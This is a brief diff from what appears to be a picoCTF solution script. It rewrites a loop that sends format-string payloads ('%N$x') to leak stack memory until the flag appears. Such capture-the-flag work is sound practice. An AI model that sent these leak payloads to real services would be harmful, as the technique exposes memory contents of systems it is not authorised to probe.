@@ -15,7 +15,7 @@ flag = b""
 read_flag_buffer = False
 i = 1
 while True:
-	payload = b"%" + b"%d$x" %(i)
+	payload = b"%%%d$x" %(i)
 	r.sendlineafter("> ", payload)
 	line = r.recvline()[:-1]
 	if pico in line:
